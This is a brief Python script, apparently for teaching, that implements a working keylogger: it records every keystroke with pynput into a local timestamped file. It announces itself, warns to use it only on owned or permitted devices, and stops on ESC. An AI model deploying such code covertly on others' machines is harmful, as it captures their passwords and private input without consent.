#!/usr/bin/env python3
"""
Basic Keylogger (Educational Purpose Only)
Captures and logs keystrokes in a controlled environment
"""

from pynput.keyboard import Key, Listener
import logging
import os
from datetime import datetime

# Configuration
LOG_FILE = "key_log.txt"

def setup_logging():
    """
    Configure logging to write keystrokes to a file with timestamps.
    """
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

def on_press(key):
    """
    Callback function triggered on each key press.
    Logs the key with proper formatting.
    """
    try:
        # For alphanumeric and other character keys
        if hasattr(key, 'char') and key.char is not None:
            logging.info(key.char)
        else:
            # For special keys
            key_name = str(key).replace('Key.', '')
            
            # Map special keys to readable format
            special_keys = {
                'space': ' ',
                'enter': '\n[ENTER]\n',
                'backspace': '[BACKSPACE]',
                'tab': '[TAB]',
                'shift': '[SHIFT]',
                'ctrl': '[CTRL]',
                'alt': '[ALT]',
                'cmd': '[CMD]',
                'esc': '[ESC]'
            }
            
            if key_name in special_keys:
                logging.info(special_keys[key_name])
            else:
                logging.info(f'[{key_name.upper()}]')
                
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def on_release(key):
    """
    Callback function triggered on key release.
    Stops the listener when ESC key is pressed.
    """
    if key == Key.esc:
        # Stop listener
        return False

def main():
    """
    Main function: starts the keylogger listener.
    """
    print("=" * 60)
    print("         BASIC KEYLOGGER - Educational Tool")
    print("=" * 60)
    print(f"[*] Keystrokes will be logged to: {LOG_FILE}")
    print("[*] Press ESC to stop the logger")
    print("=" * 60)
    print("[!] WARNING: Use this only on devices you own")
    print("[!] or have explicit permission to monitor.")
    print("=" * 60)
    
    # Setup logging
    setup_logging()
    
    # Write a session start marker
    logging.info("=" * 50)
    logging.info(f"SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logging.info("=" * 50)
    
    # Start the keyboard listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Session end marker
    logging.info("=" * 50)
    logging.info(f"SESSION ENDED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logging.info("=" * 50)
    
    print("\n[*] Keylogger stopped. Check key_log.txt for recorded keystrokes.")

if __name__ == "__main__":
    main()